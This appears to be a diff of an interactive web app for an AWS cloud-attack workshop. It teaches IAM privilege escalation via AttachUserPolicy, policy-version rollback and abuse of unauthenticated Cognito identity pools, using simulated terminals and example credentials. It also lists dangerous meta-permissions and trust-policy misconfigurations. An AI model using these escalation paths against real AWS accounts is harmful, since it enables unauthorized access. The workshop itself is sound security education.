-<div class="callout danger"><strong>Identity Pools are an identity broker.</strong> They translate "app user" into "AWS principal." That second part is where the attack lives.</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a3-trust')">The Trust Model →</button></div>
-</div>
-
-<!-- ATTACK 3: TRUST MODEL -->
-<div class="scr" data-id="a3-trust">
-<div class="badge">Attack 3 — The Misconfiguration</div>
-<h1 class="ptitle">Allow Unauthenticated Identities</h1>
-<p class="psub">When this setting is on, anyone — without logging in at all — can request temporary AWS credentials.</p>
-<div class="arch mb-24" style="gap:16px;padding:32px">
-<div class="an"><div class="an-s">No credentials</div><div class="an-l" style="color:var(--r)">Anonymous User</div></div>
-<div class="aarr atk">→ GetId</div>
-<div class="an"><div class="ai aws-cog">${CSVG}</div><div class="an-l">Identity Pool</div><div class="an-s">Unauth enabled</div></div>
-<div class="aarr atk">→ GetCredentials</div>
-<div class="an vuln"><div class="ai aws-iam">${ISVG}</div><div class="an-l" style="color:var(--r)">Unauth IAM Role</div><div class="an-s" style="color:var(--r)">Overpermissioned</div></div>
-</div>
-<div class="card mb-24"><h4>The Problem</h4><div style="font-size:14px;color:var(--t2);line-height:1.7;margin-top:8px">The Identity Pool ID is exposed in the app's JavaScript source — it's a client-side identifier, not a secret.<br><br>The <strong>unauth role</strong> was set up during development, given broad access for testing, and never tightened.<br><br>The team configured the <strong>authenticated</strong> role carefully. But the unauth role? It was forgotten.</div></div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('a3-exploit')">The Exploit →</button></div>
-</div>
-
-<!-- ATTACK 3: EXPLOIT (interactive) -->
-<div class="scr" data-id="a3-exploit">
-<div class="badge">Attack 3 — The Exploit</div>
-<h1 class="ptitle">No Username. No Password. AWS Credentials.</h1>
-<p class="psub">Two API calls. Zero authentication. Cognito hands you a badge.</p>
-<div class="split"><div>
-<div class="card mb-16"><h4>What the Attacker Has</h4><div style="font-size:13px;color:var(--t2);margin-top:8px">Just the Identity Pool ID: <code>us-east-1:a1b2c3d4-e5f6-7890-dead-beefcafe1234</code><br><br>Found in the app's JavaScript source. Not a secret.</div></div>
-<div id="a3-creds" class="cbox ok"><h4 style="color:var(--g)">AWS Credentials Obtained — Zero Auth</h4><div style="font-family:var(--mono);font-size:12px;color:var(--tm);line-height:1.8;margin-top:8px">AccessKeyId: <span style="color:var(--a)">ASIAZ3UNAUTH7EXAMPLE</span><br>SecretKey: <span style="color:var(--a)">wJalr+UnauthCognito/K7MDENG</span><br>Token: <span style="color:var(--a)">IQoJb3JpZ2lu...truncated</span></div>
-<div class="why-box vis mt-12"><strong>The attacker walked up to the front door and Cognito handed them a badge.</strong> This is identity brokering + weak trust assumptions. The broker is working correctly. The trust decision is the flaw.</div></div>
-</div><div>
-<div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">cognito-exploit</span></div><div class="tb2" id="t-a3"></div>
-<div class="thint"><span class="hk">↵</span> submit <span style="margin-left:auto"><span class="hc" onclick="runA3()">Run exploit</span></span></div></div>
-</div></div>
-<div class="mt-24"><button class="btn btn1" id="a3-next" onclick="nav('a3-takeaway')" disabled>Takeaway →</button></div>
-</div>
-
-<!-- ATTACK 3: TAKEAWAY -->
-<div class="scr" data-id="a3-takeaway">
-<div class="badge">Attack 3 — Takeaway</div>
-<h1 class="ptitle">Audit Both Roles. The Pool ID is Not a Secret.</h1>
-<p class="psub">Same pattern, different entry point. Anonymous → through Cognito → to an IAM role with real AWS permissions.</p>
-<div class="cg cg3 mb-24">
-<div class="card"><h4>Lesson 1</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Audit both <strong>authenticated AND unauthenticated</strong> roles. The unauth role is the one people forget.</p></div>
-<div class="card"><h4>Lesson 2</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">The Identity Pool ID is <strong>not a secret</strong>. Assume attackers have it. Security comes from role permissions, not obscurity.</p></div>
-<div class="card"><h4>Lesson 3</h4><p style="font-size:14px;color:var(--t2);margin-top:8px">Same core pattern: find an identity path through the graph. <strong>Anonymous → Cognito → IAM role</strong>. Graph traversal, different entry point.</p></div>
-</div>
-<div class="mt-24"><button class="btn btn1" onclick="nav('wrap')">Wrap Up →</button></div>
-</div>
-
-<!-- WRAP + HANDOFF -->
-<div class="scr" data-id="wrap">
-<div class="badge">The Common Thread</div>
-<h1 class="ptitle">Three Attacks. One Pattern.</h1>
-<p class="psub">Limited principal → misconfigured edge → escalation. No zero-days. No malware. Just identity.</p>
-<div class="kcg" id="kc">
-<div class="kcp ph-r"><div class="kcl">Attack 1</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>IAM Privilege Escalation <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Meta-permission (AttachUserPolicy) → self-granted AdministratorAccess</p></div></div>
-<div class="kcp ph-e"><div class="kcl">Attack 2</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Policy Version Rollback <span class="tag tag-iam" style="margin-left:6px">IAM</span></h4><p>Dormant v1 with Action:* → SetDefaultPolicyVersion → rewound time</p></div></div>
-<div class="kcp ph-s"><div class="kcl">Attack 3</div><div class="kcln"><div class="kcd"></div></div><div class="kcc"><h4>Cognito Identity Pool <span class="tag tag-cog" style="margin-left:6px">Cognito</span></h4><p>Anonymous → unauthenticated role → AWS credentials with zero auth</p></div></div>
-</div>
-<div class="quote" style="margin-top:24px">"In cloud, your identity configuration IS your security posture. If the permission graph has paths you didn't intend, attackers will find them."</div>
-<div class="callout insight mt-24"><strong>Handoff:</strong> Those were the first three attacks — all focused on AWS identity. Next up: what happens when compute services become the stepping stones — EC2 metadata theft, Lambda abuse, and how the same identity graph concept plays out at the service layer.</div>
-<div class="mt-24 tc"><button class="btn btn2" onclick="nav('title')">↺ Restart Demo</button></div>
-</div>
+function genAllScreens(){return `
+${s1()}${s2()}${s3()}${s41()}${s42()}${s43()}${s51()}${s52()}${s53()}${s6()}${s70()}${s70b()}${s71()}${s71a()}${s71b()}${s72()}${s73()}${s74a()}${s74()}${s80()}${s81()}${s90()}${s91()}${s100()}${s11s()}
 `}
 
-// ═══ SCREEN INIT ═══
-function init(id){
-  const m={'a1-discover':initA1D,'a2-discover':initA2D,'a2-exploit':initA2E,'wrap':initKC};
+function s1(){return `<div class="scr" data-id="1"><div class="tc" style="margin-top:24px"><div class="badge" style="justify-content:center">Hack The Bay 3.0</div><h1 class="ptitle" style="font-size:52px">AWS Cloud Attack Workshop</h1><p class="psub" style="margin:10px auto 20px;max-width:640px;text-align:center">Identity is the perimeter. Misconfiguration is the exploit.</p><div class="quote" style="max-width:700px;margin:0 auto 36px;font-size:18px;text-align:left">"A cloud IAM attack is not breaking a window. It's finding out your badge already opens more doors than anyone realized — or that it lets you print a better badge."</div></div><div class="cg cg4" style="max-width:880px;margin:0 auto 44px"><div class="mc"><div class="mv" data-count="7">0</div><div class="ml">Attack Vectors</div></div><div class="mc"><div class="mv" data-count="5">0</div><div class="ml">AWS Services</div></div><div class="mc"><div class="mv" data-count="1">0</div><div class="ml">Kill Chain</div></div><div class="mc"><div class="mv" data-count="45">0</div><div class="ml">Minutes</div></div></div><div class="arch" style="max-width:880px;margin:0 auto 44px;gap:8px"><div class="an"><div class="ai aws-iam">${ISVG}</div><div class="an-l">Identity</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-cog">${CSVG}</div><div class="an-l">Federation</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-ec2">${ESVG}</div><div class="an-l">Compute</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-s3">${SSVG}</div><div class="an-l">Data</div></div><div class="aarr">→</div><div class="an"><div class="ai aws-lam">${LSVG}</div><div class="an-l">Serverless</div></div></div><div class="callout insight" style="max-width:880px;margin:0 auto 30px"><strong>Unifying Pattern:</strong> Every cloud attack follows the same steps — find an identity, understand trust relationships, traverse edges in the identity graph, escalate, repeat.</div><div class="tc"><button class="btn btn1 pulse" onclick="nav('2')">Begin Workshop →</button></div></div>`}
+
+function s2(){return `<div class="scr" data-id="2"><div class="badge">Introduction</div><h1 class="ptitle">The 5 Pillars</h1><p class="psub">Every attack in this workshop comes back to these ideas.</p><div style="max-width:700px;margin-bottom:28px"><div class="pillar"><span class="pnum">1</span><strong>IAM is the real control plane.</strong> <span style="color:var(--t2)">Every API call goes through it.</span></div><div class="pillar"><span class="pnum">2</span><strong>Misconfiguration is enough.</strong> <span style="color:var(--t2)">No zero-day required.</span></div><div class="pillar"><span class="pnum">3</span><strong>Identity mobility.</strong> <span style="color:var(--t2)">Attackers ask "what can I become" — not just "what can I do."</span></div><div class="pillar"><span class="pnum">4</span><strong>Meta-permissions are privilege multipliers.</strong> <span style="color:var(--t2)">Permissions that edit policies or change trust relationships.</span></div><div class="pillar"><span class="pnum">5</span><strong>Cloud attacks are graph traversals.</strong> <span style="color:var(--t2)">You move across identities and services, not machines.</span></div></div><div class="card mb-24"><h4>The Attack Pattern</h4><div style="display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:12px"><div style="padding:10px 16px;border-radius:var(--rads);background:rgba(74,144,217,.08);border:1px solid rgba(74,144,217,.2);font-size:13px;font-weight:700;color:var(--b)">Enumerate</div><div class="aarr">→</div><div style="padding:10px 16px;border-radius:var(--rads);background:rgba(240,160,48,.08);border:1px solid rgba(240,160,48,.2);font-size:13px;font-weight:700;color:var(--a)">Find Trust Edge</div><div class="aarr">→</div><div style="padding:10px 16px;border-radius:var(--rads);background:rgba(255,71,87,.08);border:1px solid rgba(255,71,87,.2);font-size:13px;font-weight:700;color:var(--r)">Traverse</div><div class="aarr">→</div><div style="padding:10px 16px;border-radius:var(--rads);background:rgba(155,109,255,.08);border:1px solid rgba(155,109,255,.2);font-size:13px;font-weight:700;color:var(--p)">Escalate</div><div class="aarr">→</div><div style="padding:10px 16px;border-radius:var(--rads);background:rgba(0,232,123,.06);border:1px solid rgba(0,232,123,.2);font-size:13px;font-weight:700;color:var(--g)">Repeat</div></div></div><div class="mt-24"><button class="btn btn1" onclick="nav('3')">Setup Pre-Reqs →</button></div></div>`}
+
+function s3(){return `<div class="scr" data-id="3"><div class="badge">Prerequisites</div><h1 class="ptitle">Setting up Pre-Reqs</h1><p class="psub">Verify your environment has the required tools.</p><div class="cg cg2" style="max-width:800px"><div class="card"><h4>AWS CLI v2</h4><p style="font-size:13px;color:var(--tm)">Command-line interface for AWS API calls</p><button class="btn btng btns mt-12" onclick="chkPre('aws')">Verify →</button><div class="mt-8" id="pre-aws"></div></div><div class="card"><h4>Python 3.x</h4><p style="font-size:13px;color:var(--tm)">Required for CloudGoat and boto3</p><button class="btn btng btns mt-12" onclick="chkPre('py')">Verify →</button><div class="mt-8" id="pre-py"></div></div><div class="card"><h4>Terraform</h4><p style="font-size:13px;color:var(--tm)">Infrastructure provisioning (optional)</p><button class="btn btng btns mt-12" onclick="chkPre('tf')">Verify →</button><div class="mt-8" id="pre-tf"></div></div><div class="card"><h4>Git</h4><p style="font-size:13px;color:var(--tm)">Clone repositories</p><button class="btn btng btns mt-12" onclick="chkPre('git')">Verify →</button><div class="mt-8" id="pre-git"></div></div></div><div class="mt-30"><button class="btn btn1" onclick="nav('4.1')">Setup AWS Accounts →</button></div></div>`}
+
+function s41(){return `<div class="scr" data-id="4.1"><div class="badge">AWS Accounts</div><h1 class="ptitle">Access to AWS Console</h1><p class="psub">The web interface for managing AWS. Always use an IAM user — never root.</p><div class="split"><div class="card"><h3>Console Access</h3><p style="font-size:14px;color:var(--t2)">The root user has unrestricted access — it can't be limited by IAM policies. Think of it like <code>root</code> on Linux, except it also owns the billing.</p><div class="callout warning mt-16"><strong>Best Practice:</strong> Lock away root credentials, enable MFA, create a dedicated IAM admin user.</div><button class="btn btn1 mt-16" onclick="nav('4.2')">Create IAM User →</button></div><div class="card" style="background:var(--bg3)"><h4 class="mb-12" style="color:var(--b)">Root vs IAM User</h4><div style="font-size:13px;color:var(--t2);line-height:1.7"><div class="mb-8"><strong style="color:var(--r)">Root</strong> — Cannot be limited by IAM policies. Owns billing. Can close the account. Has permanent credentials.</div><div><strong style="color:var(--g)">IAM User</strong> — Controlled by policies. Has an ARN like <code>arn:aws:iam::123456789012:user/alice</code>. Can have access keys (long-lived) or console password. Can be disabled or deleted.</div></div></div></div></div>`}
+
+function s42(){return `<div class="scr" data-id="4.2"><div class="badge">AWS Accounts</div><h1 class="ptitle">Create IAM Admin User</h1><p class="psub">Create a dedicated admin user with programmatic and console access.</p><div class="split"><div><div class="card mb-16"><div class="mb-16"><label class="flbl">Username</label><input class="fi" id="iam-u" placeholder="e.g. iamadmin" autocomplete="off"><div class="ferr" id="iam-u-e">Username is required</div></div><div class="mb-16"><label class="flbl">Attach Policy</label><select class="fsel" id="iam-pol"><option value="">Select policy...</option><option value="AdministratorAccess">AdministratorAccess (Full)</option><option value="PowerUserAccess">PowerUserAccess (No IAM)</option><option value="ReadOnlyAccess">ReadOnlyAccess</option></select></div><div class="epan" id="iam-pol-e"><h4>Insufficient Permissions</h4><p id="iam-pol-em"></p><div class="fix">Select <strong>AdministratorAccess</strong> for the workshop.</div></div><button class="btn btn1" onclick="mkIAM()">Create User →</button></div><div class="callout danger" style="display:none" id="adm-w"><strong>In Production:</strong> Never use AdministratorAccess for daily operations. Follow least privilege — grant only the specific actions and resources needed.</div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">AWS IAM</span></div><div class="tb2" id="t42"><span style="color:var(--td);font-style:italic">Waiting for input...</span></div></div></div></div></div>`}
+
+function s43(){return `<div class="scr" data-id="4.3"><div class="badge">AWS Accounts</div><h1 class="ptitle">Access Using AWS CLI</h1><p class="psub">Configure credentials and verify identity. Every CLI command is an API call signed with SigV4.</p><div class="split"><div><div class="card mb-16"><h4>Your Credentials</h4><div class="mt-12" style="font-size:13px;font-family:var(--mono);color:var(--t2);line-height:2">Access Key ID: <span style="color:var(--g)">AKIAIOSFODNN7EXAMPLE</span><br>Secret Key: <span style="color:var(--g)">wJalrXUtnFEMI/K7MDENG/bPx</span></div><div class="callout insight mt-12"><strong>AKIA prefix</strong> = permanent IAM user key. <strong>ASIA prefix</strong> = temporary STS-issued credentials. This distinction matters during enumeration.</div></div></div><div><div class="term focus"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">aws configure</span></div><div class="tb2" id="t43"></div><div class="thint" id="cli-h"><span class="hk">↵</span> submit <span style="margin-left:auto">Suggested: <span class="hc" id="cli-hc" onclick="cliHint()"></span></span></div></div></div></div></div>`}
+
+function s51(){return `<div class="scr" data-id="5.1"><div class="badge">Student Environment</div><h1 class="ptitle">Setup via Script</h1><p class="psub">Deploy vulnerable lab infrastructure using CloudGoat.</p><div class="split"><div class="card"><h3>Automated Deployment</h3><p style="font-size:13px;color:var(--t2)" class="mb-16">CloudGoat by Rhino Security Labs provisions intentionally vulnerable AWS infrastructure for security training.</p><div class="callout warning mt-16"><strong>Cost:</strong> Lab resources incur charges. Always cleanup when finished.</div><button class="btn btn1 mt-16" onclick="runSetup()">Run Setup →</button></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">setup</span></div><div class="tb2" id="t51"></div></div></div></div></div>`}
+
+function s52(){return `<div class="scr" data-id="5.2"><div class="badge">Student Environment</div><h1 class="ptitle">Setup via Console</h1><p class="psub">Alternative: manually launch a pre-configured AMI.</p><div class="card" style="max-width:800px"><h3>Manual Setup</h3><div class="mt-16" style="font-size:14px;color:var(--t2);line-height:2"><strong>1.</strong> EC2 → AMIs → Public Images → Search workshop AMI<br><strong>2.</strong> Launch t2.micro, create key pair (.pem)<br><strong>3.</strong> Security group: allow SSH (port 22)<br><strong>4.</strong> Enable auto-assign public IP<br><strong>5.</strong> <code>chmod 400 key.pem && ssh -i key.pem ubuntu@&lt;ip&gt;</code><br><strong>6.</strong> Run <code>aws configure</code> inside the instance</div></div><div class="mt-24"><button class="btn btn1" onclick="nav('5.3')">Continue →</button></div></div>`}
+
+function s53(){return `<div class="scr" data-id="5.3"><div class="badge">Student Environment</div><h1 class="ptitle">Timezone-Based Errors</h1><p class="psub">AWS SigV4 signing includes a timestamp. Clock skew > 5 minutes = rejected requests.</p><div class="split"><div class="card"><h3>SignatureDoesNotMatch</h3><p style="font-size:13px;color:var(--t2)">AWS rejects requests if your system clock is more than 5 minutes off. The SigV4 signature includes a timestamp that AWS validates.</p><h4 class="mt-20">Fix</h4><div style="font-size:13px;font-family:var(--mono);color:var(--t2);line-height:2;margin-top:8px">sudo apt install ntp<br>sudo ntpdate ntp.ubuntu.com<br>sudo service ntp restart</div></div><div><div class="term"><div class="th"><div class="td r"></div><div class="td y"></div><div class="td g"></div><span class="tt">terminal</span></div><div class="tb2" id="t53"></div></div></div></div><div class="mt-24"><button class="btn btn1" onclick="nav('6')">View Attack Surface →</button></div></div>`}
+
+function s6(){return `<div class="scr" data-id="6"><div class="badge">Attack Surface</div><h1 class="ptitle">IAM, Cloud Compute, Serverless, Cognito</h1><p class="psub">Four attack domains. Each targets different trust boundaries in the AWS identity graph.</p><div class="cg cg4 mb-30"><div class="card" style="cursor:pointer;border-top:3px solid var(--b)" onclick="nav('7.0')"><div class="ai aws-iam mb-8" style="width:36px;height:36px">${ISVG}</div><h4>IAM</h4><div style="font-size:12px;color:var(--tm)">Policy version rollback, meta-permission abuse</div><div style="font-size:11px;color:var(--td);margin-top:4px">Trust boundary: policy-to-principal binding</div><div class="mt-8"><span class="tag tag-crit">2 Vectors</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--o)" onclick="nav('7.4a')"><div class="ai aws-cog mb-8" style="width:36px;height:36px">${CSVG}</div><h4>Cognito</h4><div style="font-size:12px;color:var(--tm)">Attribute injection, identity pool abuse</div><div style="font-size:11px;color:var(--td);margin-top:4px">Trust boundary: federation-to-IAM mapping</div><div class="mt-8"><span class="tag tag-crit">1 Vector</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--a)" onclick="nav('8.0')"><div class="ai aws-ec2 mb-8" style="width:36px;height:36px">${ESVG}</div><h4>EC2 / SSRF</h4><div style="font-size:12px;color:var(--tm)">SSRF → IMDS → credential theft</div><div style="font-size:11px;color:var(--td);margin-top:4px">Trust boundary: instance-to-metadata service</div><div class="mt-8"><span class="tag tag-crit">1 Chain</span></div></div><div class="card" style="cursor:pointer;border-top:3px solid var(--p)" onclick="nav('9.0')"><div class="ai aws-lam mb-8" style="width:36px;height:36px">${LSVG}</div><h4>Lambda</h4><div style="font-size:12px;color:var(--tm)">Confused deputy, PassRole abuse</div><div style="font-size:11px;color:var(--td);margin-top:4px">Trust boundary: user-to-service delegation</div><div class="mt-8"><span class="tag tag-home">Assignment</span></div></div></div><div class="callout insight"><strong>The Thread:</strong> Each attack exploits a different trust boundary, but the pattern is identical — enumerate, find a misconfigured edge, traverse it, escalate.</div><div class="mt-24"><button class="btn btn1" onclick="nav('7.0')">Begin with IAM →</button></div></div>`}
+
+// ═══ 7.0 IAM DEEP DIVE ═══
+function s70(){return `<div class="scr" data-id="7.0"><div class="badge">AWS IAM — Deep Dive</div><h1 class="ptitle">What IAM Actually Is</h1><p class="psub">IAM is not a user directory. It's a policy evaluation engine that sits in the request path of every AWS API call.</p><div class="card mb-24"><h4>How Every AWS API Call Works</h4><div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:12px;font-size:13px"><div style="padding:8px 14px;border-radius:var(--rads);background:var(--bg3);border:1px solid var(--br);color:var(--t2)">CLI/SDK finds credentials</div><div class="aarr">→</div><div style="padding:8px 14px;border-radius:var(--rads);background:var(--bg3);border:1px solid var(--br);color:var(--t2)">Signs request (SigV4)</div><div class="aarr">→</div><div style="padding:8px 14px;border-radius:var(--rads);background:var(--bg3);border:1px solid var(--br);color:var(--t2)">Hits API endpoint</div><div class="aarr">→</div><div style="padding:8px 14px;border-radius:var(--rads);background:rgba(74,144,217,.08);border:1px solid rgba(74,144,217,.2);color:var(--b);font-weight:700">IAM evaluates policies</div><div class="aarr">→</div><div style="padding:8px 14px;border-radius:var(--rads);background:var(--bg3);border:1px solid var(--br);color:var(--t2)">Allow or Deny</div></div></div><h3>The 5 Types of Principals</h3><div class="principal-grid"><div class="principal-card"><div class="p-icon" style="color:var(--r)">👑</div><div class="p-name">Root</div><div class="p-desc">Unrestricted. Can't be limited by IAM.</div></div><div class="principal-card"><div class="p-icon" style="color:var(--b)">👤</div><div class="p-name">IAM User</div><div class="p-desc">Persistent identity. Long-lived credentials (AKIA).</div></div><div class="principal-card"><div class="p-icon" style="color:var(--p)">🎭</div><div class="p-name">IAM Role</div><div class="p-desc">No permanent creds. Must be assumed. Temp creds (ASIA).</div></div><div class="principal-card"><div class="p-icon" style="color:var(--o)">🔗</div><div class="p-name">Federated</div><div class="p-desc">External identity mapped to a role via SAML/OIDC/Cognito.</div></div><div class="principal-card"><div class="p-icon" style="color:var(--g)">⚙</div><div class="p-name">Service</div><div class="p-desc">AWS services (Lambda, EC2) act as principals via roles.</div></div></div><div class="card mb-24"><h4>How AssumeRole Works — The Dual Check</h4><p style="font-size:13px;color:var(--t2);margin:12px 0">When a principal calls <code>sts:AssumeRole</code>, AWS checks <strong>two things simultaneously</strong>:</p><div class="split" style="gap:12px"><div style="padding:16px;border-radius:var(--rads);border:1px solid rgba(74,144,217,.3);background:rgba(74,144,217,.04)"><h4 style="color:var(--b);font-size:14px">Check A: Caller's Permission</h4><p style="font-size:12px;color:var(--t2);margin-top:6px">Does the caller's identity-based policy allow <code>sts:AssumeRole</code> on this role's ARN?</p></div><div style="padding:16px;border-radius:var(--rads);border:1px solid rgba(0,232,123,.3);background:rgba(0,232,123,.03)"><h4 style="color:var(--g);font-size:14px">Check B: Role's Trust Policy</h4><p style="font-size:12px;color:var(--t2);margin-top:6px">Does the role's trust policy list this caller as a trusted principal?</p></div></div><div class="callout danger mt-12"><strong>Both must pass.</strong> If the trust policy trusts the entire account (<code>arn:aws:iam::ACCOUNT:root</code>), then ANY principal in that account with <code>sts:AssumeRole</code> permission can become that role. This is where most misconfiguration lives.</div></div><div class="card mb-24"><h4>STS — The Credential Vending Machine</h4><p style="font-size:13px;color:var(--t2);margin-top:8px">STS (Security Token Service) issues temporary credentials. Key operations:</p><div style="margin-top:12px;font-size:13px;color:var(--t2);line-height:1.8"><strong style="color:var(--cy)">sts:AssumeRole</strong> — Become a role. Get temp creds. The identity transformation primitive.<br><strong style="color:var(--cy)">sts:GetCallerIdentity</strong> — Who am I right now? Always allowed. First thing attackers run.<br><strong style="color:var(--cy)">sts:AssumeRoleWithWebIdentity</strong> — Federated login via OIDC/Cognito → role → temp creds.</div></div><div class="mt-24"><button class="btn btn1" onclick="nav('7.0b')">Policy Evaluation Logic →</button></div></div>`}
+
+// ═══ 7.0b POLICY EVALUATION ═══
+function s70b(){return `<div class="scr" data-id="7.0b"><div class="badge">AWS IAM</div><h1 class="ptitle">How AWS Decides Allow or Deny</h1><p class="psub">The evaluation algorithm that runs on every single API call.</p><div class="eval-flow mb-24"><div class="eval-step default">Start: Default Deny</div><div class="eval-arrow">→</div><div class="eval-step deny">Explicit Deny?<br><span style="font-size:11px;font-weight:400">Access DENIED. Full stop.</span></div><div class="eval-arrow">→</div><div class="eval-step allow">Explicit Allow?<br><span style="font-size:11px;font-weight:400">Check boundaries, SCPs</span></div><div class="eval-arrow">→</div><div class="eval-step default">No Allow Found<br><span style="font-size:11px;font-weight:400">Implicit deny</span></div></div><div class="callout danger mb-24"><strong>The Rule:</strong> Explicit Deny always wins. You cannot "fix" a deny by adding an allow. Deny > Allow > Default Deny.</div><div class="card mb-24"><h4>Policy Versioning — The Attack Surface</h4><p style="font-size:13px;color:var(--t2);margin:10px 0">Customer managed policies can have <strong>up to 5 versions</strong>. Only one is the "default" (active). The others sit dormant — but they still exist.</p><div style="margin-top:12px;font-size:13px;color:var(--t2);line-height:1.8"><strong style="color:var(--r)">The Attack:</strong> If an old version was more permissive (e.g., <code>Action: *</code> during development) and someone only narrowed the current version — the old version is still there. A user with <code>iam:SetDefaultPolicyVersion</code> can <strong>roll back</strong> to it.</div><div class="callout danger mt-12"><strong>This is the rollback attack we'll execute next.</strong> The user has <code>SetDefaultPolicyVersion</code> in their current policy. That's a <em>dangerous meta-permission</em> — it lets them modify which version is active on their own policy.</div></div><div class="mt-24"><button class="btn btn1" onclick="nav('7.1')">View Misconfigurations →</button></div></div>`}
+
+// ═══ 7.1 SIX MISCONFIG CATEGORIES ═══
+function s71(){return `<div class="scr" data-id="7.1"><div class="badge">AWS IAM</div><h1 class="ptitle">6 Categories of IAM Misconfiguration</h1><p class="psub">The systematic taxonomy of how IAM goes wrong.</p><div class="cg cg2 mb-24"><div class="card" style="border-left:3px solid var(--r);cursor:pointer" onclick="toggleMC('mc1')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">1. Over-Broad Capability</h4><span class="tag tag-crit">Critical</span></div><div style="font-size:13px;color:var(--t2)">Too many API actions. <code>"Action": "*"</code> or <code>"Action": "iam:*"</code></div><div class="misconfig-detail" id="mc1"><strong>Example:</strong> <code>AdministratorAccess</code> when only S3 read was needed.<br><br><strong>Danger:</strong> The principal can call every action the team never intended. An attacker gets the full range.</div></div>
+<div class="card" style="border-left:3px solid var(--r);cursor:pointer" onclick="toggleMC('mc2')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">2. Over-Broad Scope</h4><span class="tag tag-crit">Critical</span></div><div style="font-size:13px;color:var(--t2)">Right actions, wrong scope. <code>"Resource": "*"</code></div><div class="misconfig-detail" id="mc2"><strong>Example:</strong> <code>s3:GetObject</code> on <code>Resource: "*"</code> instead of a specific bucket ARN.<br><br><strong>Danger:</strong> A role meant for one S3 bucket can access every bucket in the account.</div></div>
+<div class="card" style="border-left:3px solid var(--a);cursor:pointer" onclick="toggleMC('mc3')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">3. Dangerous Meta-Permissions</h4><span class="tag tag-ec2">High</span></div><div style="font-size:13px;color:var(--t2)">Permissions that modify the permission system itself.</div><div class="misconfig-detail" id="mc3"><strong>The Privilege Multipliers:</strong><br>• <code>iam:CreatePolicyVersion</code> — create + set as default in one call<br>• <code>iam:SetDefaultPolicyVersion</code> — rollback to old version<br>• <code>iam:AttachUserPolicy</code> — attach any managed policy to any user<br>• <code>iam:PutUserPolicy</code> — create inline policy on any user<br>• <code>iam:PassRole</code> — assign roles to services<br><br><em>Any ONE of these, scoped broadly, is often enough for full escalation.</em></div></div>
+<div class="card" style="border-left:3px solid var(--a);cursor:pointer" onclick="toggleMC('mc4')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">4. Unsafe Trust</h4><span class="tag tag-ec2">High</span></div><div style="font-size:13px;color:var(--t2)">Role trust policies that are too permissive.</div><div class="misconfig-detail" id="mc4"><strong>Dangerous patterns:</strong><br>• <code>"Principal": {"AWS": "arn:aws:iam::ACCOUNT:root"}</code> — trusts ANY principal in the account<br>• <code>"Principal": {"AWS": "*"}</code> — trusts ANYONE with an AWS account<br>• <code>"Principal": {"Service": "lambda.amazonaws.com"}</code> — without conditions</div></div>
+<div class="card" style="border-left:3px solid var(--p);cursor:pointer" onclick="toggleMC('mc5')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">5. Indirect Privilege Paths</h4><span class="tag tag-lam">Medium</span></div><div style="font-size:13px;color:var(--t2)">Can't do it directly, but can control something that can.</div><div class="misconfig-detail" id="mc5"><strong>Graph traversals:</strong><br>• Can't assume AdminRole → but can update its trust policy → add yourself → then assume<br>• Can't read secrets → but can modify a Lambda that reads them → inject code<br>• <code>iam:PassRole</code> + <code>lambda:CreateFunction</code> = indirect role assumption</div></div>
+<div class="card" style="border-left:3px solid var(--tm);cursor:pointer" onclick="toggleMC('mc6')"><div style="display:flex;align-items:center;gap:12px;margin-bottom:4px"><h4 style="margin:0">6. Legacy / Hidden State</h4><span class="tag tag-iam">Medium</span></div><div style="font-size:13px;color:var(--t2)">Stale configurations that create unintended access.</div><div class="misconfig-detail" id="mc6"><strong>Examples:</strong><br>• <strong>Old policy versions</strong> — permissive v1 still exists, SetDefaultPolicyVersion reverts to it<br>• <strong>Unused roles</strong> — created 2 years ago, never deleted, broad permissions<br>• <strong>Forgotten access keys</strong> — employee left, keys still work<br>• <strong>Stale IP conditions</strong> — office IP range was reassigned</div></div></div><div class="callout insight"><strong>Next:</strong> We'll demonstrate three attacks. Attack 1 exploits <strong>#3</strong> (iam:AttachUserPolicy). Attack 2 exploits <strong>#3 + #6</strong> (SetDefaultPolicyVersion + dormant versions). Attack 3 exploits <strong>#4</strong> (unsafe Cognito trust).</div><div class="mt-24"><button class="btn btn1" onclick="nav('7.1a')">Attack 1: IAM Privilege Escalation →</button></div></div>`}
+
+// Remaining screens use same patterns as before — abbreviated for the key interactive ones
+// ═══ ATTACK 1: IAM Privilege Escalation via AttachUserPolicy ═══
+function s71a(){return `<div class="scr" data-id="7.1a"><div class="badge">Attack 1 — IAM Privilege Escalation</div><h1 class="ptitle">The Meta-Permission</h1><p class="psub">dev-user: manages one application. Limited permissions. Shouldn't be anywhere near admin.</p>
